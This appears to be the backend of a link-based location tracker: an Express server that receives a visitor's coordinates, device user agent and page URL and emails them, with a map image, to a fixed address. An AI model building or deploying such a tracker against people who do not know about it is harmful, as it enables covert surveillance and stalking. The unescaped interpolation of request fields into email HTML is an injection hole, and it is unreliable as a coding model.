require('dotenv').config()
const express = require('express')
const bodyParser = require('body-parser')
const nodemailer = require('nodemailer')
const app = express()
const port = process.env.PORT || 3000

app.use(express.static('public'))
app.use(bodyParser.json())

const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: Number(process.env.SMTP_PORT || 587),
  secure: process.env.SMTP_SECURE === 'true',
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS
  }
})

const TO_EMAIL = process.env.TO_EMAIL

function buildStaticMap(lat, lon, apiKey) {
  if(!apiKey) return null;
  return `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=17&size=600x300&markers=color:red%7C${lat},${lon}&key=${apiKey}`
}

app.post('/api/send-location', async (req, res) => {
  try{
    const body = req.body
    if(!body || typeof body.latitude === 'undefined') return res.status(400).json({error:'payload invalid'})

    const subject = `📍 Laporan Lokasi dari Link`
    const staticMapUrl = process.env.GOOGLE_MAPS_API_KEY ? buildStaticMap(body.latitude, body.longitude, process.env.GOOGLE_MAPS_API_KEY) : null

    const html = `
      <h2>📍 Laporan Lokasi</h2>
      <p>Halo, berikut informasi lokasi yang dikirim pengguna:</p>
      <table cellpadding="4" cellspacing="0" border="0">
        <tr><td><strong>Koordinat</strong></td><td>${body.latitude}, ${body.longitude}</td></tr>
        <tr><td><strong>Akurasi</strong></td><td>${body.accuracy} meter</td></tr>
        <tr><td><strong>Waktu</strong></td><td>${body.timestamp}</td></tr>
        <tr><td><strong>Maps</strong></td><td><a href="${body.mapsLink}" target="_blank">Buka di Google Maps</a></td></tr>
        <tr><td><strong>Perangkat</strong></td><td>${body.userAgent}</td></tr>
        <tr><td><strong>Halaman</strong></td><td><a href="${body.pageUrl}">${body.pageUrl}</a></td></tr>
      </table>
      ${ staticMapUrl ? `<p><img src="${staticMapUrl}" alt="Peta lokasi" style="max-width:100%;height:auto;border:1px solid #ddd;margin-top:8px"/></p>` : '' }
      <p>Terima kasih,<br/><em>Bot Pelacak Lokasi</em></p>`

    await transporter.sendMail({
      from: process.env.FROM_EMAIL || process.env.SMTP_USER,
      to: TO_EMAIL,
      subject,
      html
    })

    res.json({ok:true})
  }catch(err){
    console.error(err)
    res.status(500).json({error: err.message})
  }
})

app.listen(port, ()=> console.log('Server berjalan di port', port))